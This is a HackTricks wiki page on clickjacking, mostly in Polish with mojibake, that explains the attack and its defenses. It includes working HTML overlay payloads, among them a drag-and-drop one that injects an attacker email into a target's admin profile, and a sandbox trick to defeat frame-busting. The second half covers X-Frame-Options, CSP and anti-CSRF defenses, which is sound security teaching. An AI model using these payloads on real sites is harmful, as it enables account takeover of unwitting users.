# Clickjacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the**  [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
Use [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
Get Access Today:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

## What is Clickjacking

W ataku clickjacking, **u偶ytkownik** jest **oszukiwany** do **kliknicia** w **element** na stronie internetowej, kt贸ry jest albo **niewidoczny**, albo przebrany za inny element. Ta manipulacja mo偶e prowadzi do niezamierzonych konsekwencji dla u偶ytkownika, takich jak pobieranie zoliwego oprogramowania, przekierowanie na zoliwe strony internetowe, udostpnienie danych logowania lub informacji wra偶liwych, przelewy pienidzy lub zakupy produkt贸w online.

### Prepopulate forms trick

Czasami mo偶liwe jest **wypenienie wartoci p贸l formularza za pomoc parametr贸w GET podczas adowania strony**. Atakujcy mo偶e nadu偶y tego zachowania, aby wypeni formularz dowolnymi danymi i wysa adunek clickjacking, aby u偶ytkownik nacisn przycisk Wylij.

### Populate form with Drag\&Drop

Jeli potrzebujesz, aby u偶ytkownik **wypeni formularz**, ale nie chcesz bezporednio prosi go o wpisanie jakich konkretnych informacji (jak e-mail lub konkretne haso, kt贸re znasz), mo偶esz po prostu poprosi go o **przecignicie i upuszczenie** czego, co zapisze twoje kontrolowane dane, jak w [**tym przykadzie**](https://lutfumertceylan.com.tr/posts/clickjacking-acc-takeover-drag-drop/).

### Basic Payload
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 700px;
opacity: 0.1;
z-index: 2;
}
div {
position:absolute;
top:470px;
left:60px;
z-index: 1;
}
</style>
<div>Click me</div>
<iframe src="https://vulnerable.com/email?email=asd@asd.asd"></iframe>
```
### Wieloetapowy adunek
```markup
<style>
iframe {
position:relative;
width: 500px;
height: 500px;
opacity: 0.1;
z-index: 2;
}
.firstClick, .secondClick {
position:absolute;
top:330px;
left:60px;
z-index: 1;
}
.secondClick {
left:210px;
}
</style>
<div class="firstClick">Click me first</div>
<div class="secondClick">Click me next</div>
<iframe src="https://vulnerable.net/account"></iframe>
```
### Drag\&Drop + Click adunek
```markup
<html>
<head>
<style>
#payload{
position: absolute;
top: 20px;
}
iframe{
width: 1000px;
height: 675px;
border: none;
}
.xss{
position: fixed;
background: #F00;
}
</style>
</head>
<body>
<div style="height: 26px;width: 250px;left: 41.5%;top: 340px;" class="xss">.</div>
<div style="height: 26px;width: 50px;left: 32%;top: 327px;background: #F8F;" class="xss">1. Click and press delete button</div>
<div style="height: 30px;width: 50px;left: 60%;bottom: 40px;background: #F5F;" class="xss">3.Click me</div>
<iframe sandbox="allow-modals allow-popups allow-forms allow-same-origin allow-scripts" style="opacity:0.3"src="https://target.com/panel/administration/profile/"></iframe>
<div id="payload" draggable="true" ondragstart="event.dataTransfer.setData('text/plain', 'attacker@gmail.com')"><h3>2.DRAG ME TO THE RED BOX</h3></div>
</body>
</html>
```
### XSS + Clickjacking

Jeli zidentyfikowae **atak XSS, kt贸ry wymaga, aby u偶ytkownik klikn** na jaki element, aby **wywoa** XSS, a strona jest **vulnerable to clickjacking**, mo偶esz to wykorzysta, aby oszuka u偶ytkownika do kliknicia przycisku/linku.\
Przykad:\
_Znalaze **self XSS** w niekt贸rych prywatnych szczeg贸ach konta (szczeg贸y, kt贸re **tylko ty mo偶esz ustawi i odczyta**). Strona z **formularzem** do ustawienia tych szczeg贸贸w jest **vulnerable** na **Clickjacking** i mo偶esz **wstpnie wypeni** **formularz** parametrami GET._\
\_\_Atakujcy m贸gby przygotowa atak **Clickjacking** na t stron **wstpnie wypeniajc** **formularz** adunkiem **XSS** i **oszukujc** **u偶ytkownika** do **wysania** formularza. Tak wic, **gdy formularz zostanie wysany** i wartoci zostan zmodyfikowane, **u偶ytkownik wykona XSS**.

## Strategie agodzenia Clickjacking

### Ochrona po stronie klienta

Skrypty wykonywane po stronie klienta mog podejmowa dziaania, aby zapobiec Clickjacking:

* Zapewnienie, 偶e okno aplikacji jest g贸wnym lub g贸rnym oknem.
* Uczynienie wszystkich ramek widocznymi.
* Zapobieganie klikniciom w niewidoczne ramki.
* Wykrywanie i informowanie u偶ytkownik贸w o potencjalnych pr贸bach Clickjacking.

Jednak te skrypty do amania ramek mog by obejcie:

* **Ustawienia zabezpiecze przegldarek:** Niekt贸re przegldarki mog blokowa te skrypty w zale偶noci od ich ustawie zabezpiecze lub braku wsparcia dla JavaScript.
* **Atrybut `sandbox` iframe HTML5:** Atakujcy mo偶e zneutralizowa skrypty do amania ramek, ustawiajc atrybut `sandbox` z wartociami `allow-forms` lub `allow-scripts` bez `allow-top-navigation`. To uniemo偶liwia iframe weryfikacj, czy jest g贸rnym oknem, np.,
```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms allow-scripts"></iframe>
```
The `allow-forms` and `allow-scripts` values enable actions within the iframe while disabling top-level navigation. To ensure the intended functionality of the targeted site, additional permissions like `allow-same-origin` and `allow-modals` might be necessary, depending on the attack type. Browser console messages can guide which permissions to allow.

### Server-Side Defenses

#### X-Frame-Options

The **`X-Frame-Options` HTTP response header** informs browsers about the legitimacy of rendering a page in a `<frame>` or `<iframe>`, helping to prevent Clickjacking:

* `X-Frame-Options: deny` - 呕aden domena nie mo偶e osadzi treci.
* `X-Frame-Options: sameorigin` - Tylko bie偶ca strona mo偶e osadzi tre.
* `X-Frame-Options: allow-from https://trusted.com` - Tylko okrelony 'uri' mo偶e osadzi stron.
* Zauwa偶 ograniczenia: jeli przegldarka nie obsuguje tej dyrektywy, mo偶e nie dziaa. Niekt贸re przegldarki preferuj dyrektyw CSP frame-ancestors.

#### Content Security Policy (CSP) frame-ancestors directive

**`frame-ancestors` directive in CSP** is the advised method for Clickjacking protection:

* `frame-ancestors 'none'` - Podobnie jak `X-Frame-Options: deny`.
* `frame-ancestors 'self'` - Podobnie jak `X-Frame-Options: sameorigin`.
* `frame-ancestors trusted.com` - Podobnie jak `X-Frame-Options: allow-from`.

For instance, the following CSP only allows framing from the same domain:

`Content-Security-Policy: frame-ancestors 'self';`

Further details and complex examples can be found in the [frame-ancestors CSP documentation](https://w3c.github.io/webappsec-csp/document/#directive-frame-ancestors) and [Mozilla's CSP frame-ancestors documentation](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors).

### Content Security Policy (CSP) with `child-src` and `frame-src`

**Content Security Policy (CSP)** is a security measure that helps in preventing Clickjacking and other code injection attacks by specifying which sources the browser should allow to load content.

#### `frame-src` Directive

* Definiuje wa偶ne 藕r贸da dla ramek.
* Bardziej szczeg贸owe ni偶 dyrektywa `default-src`.
```
Content-Security-Policy: frame-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki z tego samego pochodzenia (self) oraz https://trusted-website.com.

#### Dyrektywa `child-src`

* Wprowadzona w poziomie 2 CSP w celu ustawienia wa偶nych 藕r贸de dla pracownik贸w sieciowych i ramek.
* Dziaa jako zapas dla frame-src i worker-src.
```
Content-Security-Policy: child-src 'self' https://trusted-website.com;
```
Ta polityka pozwala na ramki i pracownik贸w z tego samego pochodzenia (self) oraz https://trusted-website.com.

**Uwagi dotyczce u偶ytkowania:**

* Deprecacja: child-src jest stopniowo wycofywane na rzecz frame-src i worker-src.
* Zachowanie w przypadku braku: Jeli frame-src jest nieobecne, child-src jest u偶ywane jako zapasowe dla ramek. Jeli oba s nieobecne, u偶ywane jest default-src.
* cisa definicja 藕r贸da: Uwzgldnij tylko zaufane 藕r贸da w dyrektywach, aby zapobiec wykorzystaniu.

#### Skrypty JavaScript amice ramki

Chocia偶 nie s cakowicie niezawodne, skrypty amice ramki oparte na JavaScript mog by u偶ywane do zapobiegania osadzaniu strony internetowej w ramkach. Przykad:
```javascript
if (top !== self) {
top.location = self.location;
}
```
#### Wykorzystanie token贸w Anti-CSRF

* **Walidacja token贸w:** U偶yj token贸w anti-CSRF w aplikacjach internetowych, aby upewni si, 偶e 偶dania zmieniajce stan s wykonywane celowo przez u偶ytkownika, a nie przez stron Clickjacked.

## Odniesienia

* [**https://portswigger.net/web-security/clickjacking**](https://portswigger.net/web-security/clickjacking)
* [**https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html**](https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking\_Defense\_Cheat\_Sheet.html)

<figure><img src="../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_term=trickest&utm_content=clickjacking), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=clickjacking" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
